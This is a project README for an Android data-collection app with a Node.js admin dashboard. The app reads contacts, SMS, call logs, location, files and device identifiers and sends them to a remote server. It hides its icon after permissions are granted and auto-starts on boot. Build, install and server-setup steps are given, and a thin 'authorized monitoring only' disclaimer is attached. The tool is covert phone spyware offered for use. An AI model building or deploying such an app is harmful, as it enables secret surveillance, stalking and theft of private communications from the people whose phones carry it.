# Android Data Access App with Admin Dashboard

A comprehensive Android application that collects device data and sends it to an admin dashboard for monitoring and management.

## Features

### Android App
- **Contacts**: Access and collect all contacts
- **SMS**: Read all SMS messages (sent and received)
- **Call Logs**: Track all incoming, outgoing, and missed calls
- **Installed Apps**: List all installed applications
- **Location**: Track device location
- **Files**: Access file system information
- **Device Info**: Collect device model, IMEI, phone number, etc.
- **Hidden Icon**: App icon automatically hides from launcher after installation and permissions are granted
- **Auto-Start**: Automatically starts on device boot

### Admin Dashboard
- Real-time statistics overview
- View all connected devices
- Browse contacts, SMS, call logs
- Monitor installed apps
- Track device locations
- View file system structure
- Search and filter functionality

## Setup Instructions

### 1. Backend Server Setup

```bash
cd backend-server
npm install
npm start
```

The server will run on `http://localhost:3000`

**Important**: Update the `SERVER_URL` in `MainActivity.java` with your server's IP address:
```java
private static final String SERVER_URL = "http://YOUR_SERVER_IP:3000/api/data";
```

### 2. Android App Setup

1. Open the project in Android Studio
2. Sync Gradle files
3. Update `SERVER_URL` in `MainActivity.java` with your server IP
4. Build the APK:
   - Go to `Build > Build Bundle(s) / APK(s) > Build APK(s)`
   - Or use command line: `./gradlew assembleRelease`
5. Install the APK on Android device

### 3. Permissions

The app requires the following permissions (automatically requested):
- Read Contacts
- Read SMS
- Read Call Logs
- Read Phone State
- Read External Storage
- Location Access
- Usage Access (for app usage stats)

**Important**: After granting all permissions, the app icon will automatically hide from the launcher. The app will continue running in the background and start automatically on device boot.

### 4. Access Dashboard

Open your browser and navigate to:
```
http://localhost:3000
```
or
```
http://YOUR_SERVER_IP:3000
```

## Project Structure

```
AndroidDataAccessApp/
├── android-app/
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── java/com/datacollector/app/
│   │   │   │   ├── MainActivity.java
│   │   │   │   └── DataCollectionService.java
│   │   │   ├── res/
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle
│   └── build.gradle
├── backend-server/
│   ├── server.js
│   ├── package.json
│   └── public/
│       └── index.html
└── README.md
```

## API Endpoints

- `POST /api/data` - Receive data from Android app
- `GET /api/devices` - Get all connected devices
- `GET /api/device/:deviceId/contacts` - Get contacts for device
- `GET /api/device/:deviceId/sms` - Get SMS for device
- `GET /api/device/:deviceId/call-logs` - Get call logs for device
- `GET /api/device/:deviceId/apps` - Get installed apps for device
- `GET /api/device/:deviceId/location` - Get location data for device
- `GET /api/device/:deviceId/files` - Get files for device
- `GET /api/stats` - Get overall statistics

## Security & Privacy Notes

⚠️ **Important**: This application is designed for authorized monitoring purposes only. 

- Ensure you have proper authorization before deploying
- Use HTTPS in production
- Implement authentication for the dashboard
- Secure the database and API endpoints
- Comply with local privacy laws and regulations

## Building APK

### Using Android Studio
1. Open project in Android Studio
2. Build > Generate Signed Bundle / APK
3. Select APK
4. Create keystore (first time) or use existing
5. Select release build variant
6. Finish

### Using Command Line
```bash
cd android-app
./gradlew assembleRelease
```

The APK will be in: `app/build/outputs/apk/release/app-release.apk`

## Troubleshooting

1. **App not sending data**: Check server URL in MainActivity.java
2. **Permissions denied**: Grant all permissions in device settings
3. **Server not receiving data**: Check firewall settings and ensure server is accessible
4. **Dashboard not loading**: Ensure backend server is running

## Requirements

- Android Studio (latest version)
- Node.js 14+ and npm
- Android device with API level 24+
- Network connectivity between device and server

## License

This project is for educational and authorized monitoring purposes only.
# data-management-sandeep
